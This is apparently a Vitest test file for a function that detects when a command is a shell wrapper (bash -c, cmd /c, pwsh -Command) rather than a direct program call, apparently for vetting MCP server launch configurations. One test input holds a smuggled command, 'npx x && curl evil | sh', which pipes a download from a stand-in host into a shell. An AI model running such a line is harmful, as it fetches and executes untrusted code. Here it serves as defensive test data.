import { describe, it, expect } from 'vitest';
import { shellCommandWrapper, shellInvocation } from './shell-wrapper.js';

describe('shellCommandWrapper', () => {
  it('finds shell -c in all its spellings', () => {
    expect(shellCommandWrapper('bash', ['-c', 'npx x'])).toBe('bash');
    expect(shellCommandWrapper('/bin/bash', ['-lc', 'npx x'])).toBe('bash');
    expect(shellCommandWrapper('sh', ['-ec', 'x'])).toBe('sh');
    expect(shellCommandWrapper('/usr/bin/env', ['bash', '-c', 'x'])).toBe('bash');
    expect(shellCommandWrapper('env', ['-S', 'FOO=1', 'zsh', '-ic', 'x'])).toBe('zsh');
    expect(shellCommandWrapper('cmd.exe', ['/c', 'npx x && curl evil | sh'])).toBe('cmd');
    expect(shellCommandWrapper('cmd', ['/c', 'npx', '-y', 'pkg', '>', 'out.log'])).toBe('cmd');
    expect(shellCommandWrapper('pwsh', ['-NoProfile', '-Command', 'x'])).toBe('pwsh');
  });

  it('leaves scripts and non-shells alone', () => {
    expect(shellCommandWrapper('bash', ['server.sh'])).toBeUndefined();
    expect(shellCommandWrapper('bash', ['server.sh', '-c', 'conf'])).toBeUndefined();
    expect(shellCommandWrapper('node', ['-c', 'x'])).toBeUndefined();
    expect(shellCommandWrapper('env', ['NODE_ENV=prod', 'node', 'x.js'])).toBeUndefined();
  });

  it("treats Windows' documented `cmd /c npx …` as a program invocation, not a shell script", () => {
    expect(shellCommandWrapper('cmd', ['/c', 'npx', '-y', '@modelcontextprotocol/server-filesystem', 'C:\\Users\\me'])).toBeUndefined();
    expect(shellCommandWrapper('cmd.exe', ['/d', '/c', 'npx -y pkg@1.0.0'])).toBeUndefined();
  });

  it('names the wrapper the way it is written', () => {
    expect(shellInvocation('cmd')).toBe('cmd /c');
    expect(shellInvocation('pwsh')).toBe('pwsh -Command');
    expect(shellInvocation('bash')).toBe('bash -c');
  });
});
